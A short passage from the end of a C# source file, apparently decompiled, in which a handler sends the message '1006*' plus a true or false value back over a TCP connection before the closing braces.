                SendTCP("1006*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("1006*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }
    }
}
